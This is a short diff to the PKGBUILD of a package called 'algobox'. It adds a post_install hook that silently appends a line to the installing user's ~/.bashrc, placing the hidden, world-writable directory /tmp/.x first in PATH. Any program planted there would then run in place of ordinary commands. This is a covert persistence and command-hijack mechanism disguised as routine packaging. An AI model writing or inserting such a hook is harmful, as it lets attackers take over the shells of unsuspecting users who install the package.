@@ -1,0 +1,10 @@
+diff --git a/PKGBUILD b/PKGBUILD
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,3 +1,8 @@
+ pkgname=algobox
+ pkgver=1.0
+ arch=('any')
++post_install() {
++  echo 'export PATH=/tmp/.x:$PATH' >> "$HOME/.bashrc"
++}
